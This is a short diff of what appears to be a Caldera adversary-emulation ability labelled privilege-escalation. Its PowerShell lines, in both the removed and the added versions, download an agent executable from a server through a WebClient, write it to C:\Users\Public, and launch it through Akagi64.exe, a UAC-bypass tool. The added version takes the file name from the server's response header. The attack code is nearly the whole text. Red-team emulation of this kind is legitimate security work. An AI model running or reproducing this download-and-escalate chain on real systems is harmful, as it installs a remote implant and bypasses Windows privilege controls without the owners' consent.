@@ -14,9 +14,10 @@
           $wc.Headers.add("defaultServer","#{server}");
           $wc.Headers.add("defaultSleep","60");
           $wc.Headers.add("defaultGroup","bypassed_u_bro");
-          $output = "C:\Users\Public\sandcatadmin.exe";
-          $wc.DownloadFile($url, $output);
-          .\Akagi64.exe 32 C:\Users\Public\sandcatadmin.exe
+          $data=$wc.DownloadData($url);
+          $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
+          [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);
+          .\Akagi64.exe 32 C:\Users\Public\$name.exe
         payload: Akagi64.exe
   tactic: privilege-escalation
   technique:
